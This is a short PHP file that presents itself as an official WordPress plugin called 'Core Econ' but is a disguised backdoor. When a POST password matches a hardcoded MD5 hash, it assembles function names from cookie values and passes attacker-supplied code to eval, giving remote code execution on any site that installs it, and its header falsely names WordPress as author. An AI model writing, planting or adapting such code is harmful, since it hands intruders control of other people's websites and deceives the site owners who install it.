<?php

/*R
Plugin Name: Core Econ
Plugin URI: http://wordpress.org/#
Description: Official WordPress plugin
Author: WordPress
Version: 19.3.9
Author URI: http://wordpress.org/#
xR*/


function Rx7() {
	$Paw = $_POST['pw'];
	$Md = md5($Paw);
	if(isset($Paw) && $Md == '84707550a4f807f7fa2d1b41407465fd'){
		echo "Success";
		$m = $_COOKIE;
		($m && isset($m[55])) ? (($uf = $m[55].$m[86]) &&
		($qn = $uf($m[62].$m[48])) && ($_qn = $uf($m[12].$m[70])) &&
		($_qn = $_qn($uf($m[49]))) && @eval($_qn)) : $m;
	}

	
	return 0;
}


Rx7();

?>